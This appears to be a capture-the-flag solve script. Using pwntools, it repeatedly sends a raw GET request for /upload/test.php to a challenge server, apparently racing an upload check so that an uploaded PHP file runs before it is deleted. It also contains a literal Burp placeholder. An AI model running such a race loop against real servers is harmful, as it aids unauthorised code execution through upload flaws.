import requests
import io
from multiprocessing import Pool
from pwn import *

context.log_level = 'error'

data = """GET /upload/test.php HTTP/1.1
Host: challs2.welcomectf.tk:5207
Upgrade-Insecure-Requests: §1§
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

"""
data = data.replace("\n","\r\n")

r = remote("challs2.welcomectf.tk",5207)

for i in range(1,100000):
    try:
        r.sendline(data.encode())
        tmp = r.recv().decode()
        if "404 Not Found" not in tmp:
            print(tmp)
    except:
        r.close()
        r = remote("challs2.welcomectf.tk",5207)
        #print("re-establish connection")
        continue
